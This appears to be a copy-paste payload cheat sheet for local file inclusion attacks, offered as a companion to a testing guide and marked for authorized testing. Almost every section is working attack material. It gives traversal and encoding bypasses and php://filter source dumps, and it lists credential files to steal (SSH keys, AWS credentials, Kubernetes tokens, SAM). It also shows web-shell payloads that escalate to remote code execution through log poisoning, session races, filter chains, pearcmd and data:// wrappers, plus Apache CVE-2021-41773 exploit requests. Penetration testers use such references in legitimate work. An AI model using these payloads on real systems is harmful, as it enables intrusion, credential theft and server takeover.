# LFI Arsenal — Traversal, Encodings, Wrappers & LFI→RCE Payloads (copy-paste)

> Companion to `LFI_TESTING_GUIDE.md`. Authorized testing only — benign markers, clean up artifacts (Guide §21).
> Win condition is never `/etc/passwd` — it's **secrets/source disclosure** or **RCE/shell** (Guide §10–§16).

---

## 1. Confirm traversal (depth-sweep)

```
../etc/passwd
../../etc/passwd
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../../../etc/passwd        # over-shoot is safe (root ignores extra ../)
/etc/passwd                                # absolute (no forced prefix)
../../../../etc/hostname                    # benign single-line proof
Windows:  ..\..\..\..\Windows\win.ini   |   ....\\....\\....\\Windows\win.ini   |   C:\Windows\win.ini
Signatures to match:  root:.*:0:0:    |    \[fonts\]    |    \[extensions\]
```

## 2. Defeat the forced suffix (Guide §6)

```
../../../../etc/passwd%00                    # null byte (PHP < 5.3.4 / legacy)
../../../../etc/passwd%2500                  # double-encoded null
../../../etc/passwd/././././…(repeat)        # path truncation (legacy)
php://filter/convert.base64-encode/resource=../../../etc/passwd   # suffix lands harmlessly on the resource
# if suffix forces .php and sink INCLUDES → point at a real .php (read source) or a poisoned on-disk file
```

## 3. Encoding / filter bypass (Guide §7)

```
..%2f..%2f..%2fetc%2fpasswd                  # url-encode
..%252f..%252f..%252fetc%252fpasswd          # double url-encode
....//....//....//etc/passwd                 # nested (defeats one-pass ../ strip)  ★ most reliable
..././..././..././etc/passwd
..%c0%af..%c0%afetc/passwd                   # overlong UTF-8 slash (legacy)
..%5c..%5c..%5cwindows\win.ini               # backslash (windows/mixed)
..%252e%252e%252fetc/passwd
/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

## 4. Allowlist / prefix bypass (Guide §8)

```
/var/www/html/uploads/../../../../etc/passwd        # satisfy required prefix, then traverse out
en/../../../../../etc/passwd                          # satisfy "starts with a known value"
php://filter/convert.base64-encode/resource=en/../../../config.php
images/../../../../etc/passwd%00
```

## 5. PHP wrappers — source & secret disclosure (Guide §9/§10)

```
php://filter/convert.base64-encode/resource=index.php          # dump source as base64 (decode locally)
php://filter/convert.base64-encode/resource=config.php
php://filter/convert.base64-encode/resource=../config/database.php
php://filter/convert.base64-encode/resource=.env
php://filter/read=string.rot13/resource=index.php             # rot13 variant
php://filter/convert.base64-encode/resource=wp-config.php

# high-value files to dump/read:
config.php  database.php  settings.php  wp-config.php  .env  app/etc/env.php  auth.php  secrets.php
/etc/passwd  /etc/hosts  /etc/nginx/nginx.conf  /etc/apache2/sites-enabled/000-default.conf  .git/config
/proc/self/environ  /proc/self/cmdline  /proc/self/status  ~/.bash_history  ~/.ssh/id_rsa
~/.aws/credentials  /var/run/secrets/kubernetes.io/serviceaccount/token
Windows:  C:\inetpub\wwwroot\web.config   C:\xampp\php\php.ini   C:\Windows\System32\inetsrv\config\applicationHost.config
```

```bash
# decode a php://filter base64 dump
curl -s "https://target/?page=php://filter/convert.base64-encode/resource=config.php" | base64 -d
python3 poc/phpfilter_dump.py -u "https://target/?page=PHP" -r config.php -r .env -r database.php
```

## 6. LFI → RCE: log poisoning (Guide §11)

```
# 1) poison a log (PHP in a logged field)
User-Agent: <?php system($_GET['c']); ?>
# or request a poisoned path so it lands in access.log:
GET /<?php system($_GET['c']); ?> HTTP/1.1

# 2) include the log + pass the command
?page=../../../../var/log/apache2/access.log&c=id
?page=../../../../var/log/nginx/access.log&c=id
?page=../../../../var/log/apache2/error.log&c=id
?page=../../../../var/log/auth.log&c=id          # poison via:  ssh '<?php system($_GET[c]);?>'@target
?page=../../../../var/log/mail.log&c=id          # poison via SMTP
?page=../../../../proc/self/fd/8&c=id            # brute fd numbers for an open log
```

## 7. LFI → RCE: php://filter chain (no file write) (Guide §12)

```bash
# generate a WORKING chain (poc/filter_chain_rce.py drives synacktiv's generator; auto-detected or --generator <path>):
python3 poc/filter_chain_rce.py --payload '<?php system($_GET["c"]); ?>'    # prints the php://filter chain
# or call synacktiv directly (its stdout IS just the chain):
python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]); ?>' > chain.txt
curl -s "https://target/?page=$(cat chain.txt)&c=id"
```

## 8. LFI → RCE: session & /proc poisoning (Guide §13)

```
# PHP session: store PHP in a reflected $_SESSION field, then include the session file
?page=../../../../var/lib/php/sessions/sess_<YOUR_PHPSESSID>&c=id
?page=../../../../tmp/sess_<YOUR_PHPSESSID>&c=id
# /proc/self/environ (old CGI): poison via User-Agent, then:
?page=../../../../proc/self/environ&c=id

# session.upload_progress (NO reflected field needed — default PHP) — multipart with the magic field, then RACE the include:
#   curl -s -b 'PHPSESSID=raceme' -F 'PHP_SESSION_UPLOAD_PROGRESS=<?php system($_GET[c]);?>' -F 'f=@/etc/hostname' https://target/upload
#   (loop) curl -s 'https://target/?page=../../../../var/lib/php/sessions/sess_raceme&c=id'
?page=../../../../var/lib/php/sessions/sess_raceme&c=id      # include the upload_progress-poisoned session (race window)
```

## 8b. LFI → RCE: pearcmd.php — no upload / no log, default PHP images (Guide §15)
```
# official php / php:*-apache images ship PEAR + register_argc_argv=On → ?+ becomes argv → write a shell, then include it:
?page=/usr/local/lib/php/pearcmd.php&+config-create+/<?=system($_GET['c'])?>+/tmp/shell.php
?page=/tmp/shell.php&c=id                                    # → RCE
# also try:  /usr/share/php/pearcmd.php  ·  /usr/local/lib/php/peclcmd.php
# (delete /tmp/shell.php afterward)
```

## 9. LFI → RCE: data:// / input / expect / phar / zip (Guide §14/§15)

```
# data:// (allow_url_include=On)   base64 = <?php system($_GET['c']);?>
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+&c=id

# php://input (allow_url_include=On) — send PHP in the POST body
?page=php://input        BODY: <?php system($_GET['c']); ?>     (query: ?c=id)

# expect:// (expect extension)
?page=expect://id

# zip:// (upload shell.jpg containing shell.php)
?page=zip://../../../../var/www/uploads/avatar.jpg%23shell.php&c=id

# phar:// (object injection; needs a POP gadget in app classes)
?page=phar://../../../../var/www/uploads/evil.phar/x

# upload + include (any bytes that contain PHP)
?page=../../../../var/www/uploads/<your-upload>&c=id
```

base64 helper:
```bash
echo -n '<?php system($_GET["c"]); ?>' | base64      # PD9waHAgc3lzdGVtKCRfR0VUWyJjIl0pOyA/Pg==
```

## 10. Windows / other stacks (Guide §16)

```
Windows secrets:  C:\inetpub\wwwroot\web.config  (conn strings + <machineKey>)  → forge ViewState/auth → RCE
                  C:\Windows\System32\drivers\etc\hosts   C:\Windows\repair\SAM
IIS log poison:   C:\inetpub\logs\LogFiles\W3SVC1\u_ex<date>.log
Java:   ../../../../WEB-INF/web.xml   ../../../../WEB-INF/classes/application.properties
Node:   ../../../.env   ../../../config/default.json   (template engine? → SSTI kit)
Python: ../../../settings.py   ../../../.env   (Jinja include? → SSTI kit)
.NET:   ../../web.config   (machineKey → forge auth)
Ruby:   ../../config/secrets.yml   ../../config/database.yml
```

## 10b. High-value files to read (LFI target wordlist) (guide §10/§14)
```
LINUX secrets/creds:
  /etc/passwd  /etc/shadow  /etc/hosts  /etc/issue  /etc/group  /etc/crontab  /etc/sudoers
  /root/.bash_history  /home/*/.bash_history  /root/.ssh/id_rsa  /home/*/.ssh/id_rsa  /etc/ssh/sshd_config
  /root/.aws/credentials  /home/*/.aws/credentials  /root/.config/gcloud/credentials.db
  /var/run/secrets/kubernetes.io/serviceaccount/token  /var/run/secrets/kubernetes.io/serviceaccount/namespace
  /proc/self/environ  /proc/self/cmdline  /proc/self/status  /proc/self/maps  /proc/self/fd/0..15  /proc/net/tcp
  /var/lib/php/sessions/sess_<id>  /tmp/sess_<id>   (session poisoning, §8)
APP / FRAMEWORK config (php://filter the source — §5):
  config.php database.php settings.php wp-config.php .env app/etc/env.php config/database.yml config/secrets.yml
  application.properties application.yml appsettings.json web.config local.settings.json .npmrc .git/config .htpasswd
  /var/www/html/* (source) ; vendor/ composer.json ; package.json ; Dockerfile docker-compose.yml
SERVER config / logs (log poisoning, §6):
  /etc/nginx/nginx.conf /etc/apache2/apache2.conf /etc/apache2/sites-enabled/* /usr/local/etc/php/php.ini
  /var/log/{apache2,nginx,httpd}/{access,error}.log  /var/log/auth.log  /var/log/mail.log  /var/log/vsftpd.log
WINDOWS:
  C:\Windows\win.ini  C:\Windows\System32\drivers\etc\hosts  C:\inetpub\wwwroot\web.config
  C:\Windows\System32\inetsrv\config\applicationHost.config  C:\Windows\repair\SAM  C:\Windows\System32\config\SAM
  C:\xampp\php\php.ini  C:\inetpub\logs\LogFiles\W3SVC1\*  C:\Users\*\.aws\credentials  C:\Users\*\NTUSER.DAT
```

## 10c. PHP filter-chain & wrapper extras (guide §9/§12)
```
# read source (base64) — also try compress.zlib + rot13:
php://filter/convert.base64-encode/resource=index.php
php://filter/read=convert.iconv.UTF8.UTF16|convert.base64-encode/resource=config.php   (chain to dodge filters)
php://filter/zlib.deflate/convert.base64-encode/resource=...                            (compress then b64)
# RCE without a writable file (generate with synacktiv php_filter_chain_generator.py — guide §12):
php://filter/convert.iconv.UTF8.CSISO2022KR|...long chain...|convert.base64-decode/resource=php://temp
# wrappers worth trying when allow_url_include / extensions vary:
data://text/plain;base64,<b64 php>   php://input (POST body = php)   expect://id   phar://up.phar/x   zip://a.zip%23s.php
```

## 10d. Server / infrastructure traversal payloads (guide §16.3)
```
# Apache 2.4.49 (CVE-2021-41773) / 2.4.50 (CVE-2021-42013) — file read (+ RCE if cgi-bin/mod_cgi enabled):
GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
GET /icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1          # any alias dir works
# 2.4.50 double-encoded:
GET /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd HTTP/1.1
# RCE (mod_cgi): POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh   body:  echo Content-Type: text/plain; echo; id
# nginx alias off-by-slash (read source outside the alias root):
GET /static../config/app.py HTTP/1.1     GET /assets../../etc/passwd HTTP/1.1
# IIS / .NET unicode & encoded backslash:
..%c0%af..%c0%af  ..%255c..%255c  /web.config;.aspx
# reverse-proxy %2e/%2f decode mismatch:  /%2e%2e/%2e%2e/etc/passwd  ·  /..%2f..%2fetc/passwd
```

## 10e. Second-order / stored LFI (guide §16.4)
```
# 1) store a traversal/wrapper payload in a value later used as a PATH:
theme / template / locale / avatar-path / filename =  ../../../../etc/passwd
                                                    =  php://filter/convert.base64-encode/resource=config.php
# 2) trigger the consumer (reload, run the job, get an admin to view your profile) → the stored payload is included
#    → file read / RCE, often in a higher-priv back-office/worker/admin context. Watch for the read or an OOB hit.
```

## 12. Real-world LFI / traversal CVEs & chains (guide §10-§16) + references
```
□ Apache CVE-2021-41773 / CVE-2021-42013 — path traversal → file read & RCE (mod_cgi) via /cgi-bin/.%2e/...
□ Nginx "alias" misconfig (off-by-slash) — /static../  → read app source outside the alias root.
□ Spring "Spring4Shell"-adjacent & static-resource traversal ; Tomcat /WEB-INF/web.xml exposure.
□ GitLab CVE-2023-2825 — path traversal → arbitrary file read (unauth).
□ Java %c0%ae / double-encoding traversal ; .NET ..\ ; Rails render(file:) traversal.
□ LFI → RCE via: log poisoning (§6), PHP session (§8), php://filter chain (§12), /proc/self/environ, upload+include (§9),
   phpinfo race ; Windows web.config <machineKey> → forge ViewState → RCE.
□ LFI → cloud takeover: read /proc/self/environ or ~/.aws/credentials → live keys (validate read-only, SSRF kit §11).
```
> **References:** PortSwigger *File path traversal* & *File inclusion*, PayloadsAllTheThings *File Inclusion* &
> *Directory Traversal*, HackTricks *LFI/RFI* & *LFI2RCE*, The Hacker Recipes *File inclusion*, loknop's original
> *php filter chains* gist + `synacktiv/php_filter_chain_generator` (§7/§12), Orange Tsai *Breaking Parser Logic*
> (§10d proxy/path traversal), Assetnote *Apache CVE-2021-41773* deep-dive, LFISuite/liffy, PentesterLab.
> (Full categorized link list: guide Appendix C.)

---

## 11. Triage rules (don't waste a report)

```
RCE via log/filter-chain/session/wrapper/upload      → REPORT Critical (benign marker, clean up)
source+secrets via php://filter (config/.env/keys)   → REPORT High (Critical if creds live → pivot/RCE)
/proc/self/environ · k8s token · .aws/credentials    → REPORT High (Critical if cloud/cluster access)
arbitrary read of web.config/source (no creds)       → REPORT High
/etc/passwd / win.ini only                           → Medium (traversal proof) — keep escalating
404 echoing your path / public asset / blind timing  → NOT a finding yet
```
